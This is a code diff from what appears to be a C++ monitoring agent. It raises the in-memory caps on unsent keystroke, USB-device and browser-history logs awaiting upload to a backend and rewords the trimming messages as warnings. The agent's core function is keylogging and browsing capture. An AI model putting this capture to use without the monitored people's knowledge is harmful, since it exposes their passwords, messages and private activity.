@@ -205,9 +205,11 @@ double lastBrowserTic = -1;
 bool activeRunning = true;
 
 // Memory management constants
-const size_t MAX_KEY_LOGS = 1000;
-const size_t MAX_USB_LOGS = 500;
-const size_t MAX_BROWSER_HISTORIES = 2000;
+// Allow the in-memory retry backlog to outlast temporary backend outages.
+// These are safety caps, not upload batch sizes; events are removed on ACK.
+const size_t MAX_KEY_LOGS = 25000;
+const size_t MAX_USB_LOGS = 5000;
+const size_t MAX_BROWSER_HISTORIES = 15000;
 
 std::vector<Json::Value> keyLogs;
 std::vector<Json::Value> usbDeviceLogs;
@@ -3589,21 +3591,21 @@ void manageMemoryLimits() {
     if (keyLogs.size() > MAX_KEY_LOGS) {
         size_t excess = keyLogs.size() - MAX_KEY_LOGS;
         keyLogs.erase(keyLogs.begin(), keyLogs.begin() + excess);
-        writeDebugLog("Trimmed " + std::to_string(excess) + " key logs");
+        writeDebugLog("WARNING: unsent keyboard backlog at memory cap; discarded " + std::to_string(excess) + " oldest events");
     }
     
     // Limit USB logs - more aggressive trimming
     if (usbDeviceLogs.size() > MAX_USB_LOGS) {
         size_t excess = usbDeviceLogs.size() - MAX_USB_LOGS;
         usbDeviceLogs.erase(usbDeviceLogs.begin(), usbDeviceLogs.begin() + excess);
-        writeDebugLog("Trimmed " + std::to_string(excess) + " USB logs");
+        writeDebugLog("WARNING: unsent USB backlog at memory cap; discarded " + std::to_string(excess) + " oldest events");
     }
     
     // Limit browser histories - more aggressive trimming
     if (browserHistories.size() > MAX_BROWSER_HISTORIES) {
         size_t excess = browserHistories.size() - MAX_BROWSER_HISTORIES;
         browserHistories.erase(browserHistories.begin(), browserHistories.begin() + excess);
-        writeDebugLog("Trimmed " + std::to_string(excess) + " browser histories");
+        writeDebugLog("WARNING: unsent browser backlog at memory cap; discarded " + std::to_string(excess) + " oldest events");
     }
     
     // Force garbage collection by shrinking vectors if they're much larger than needed
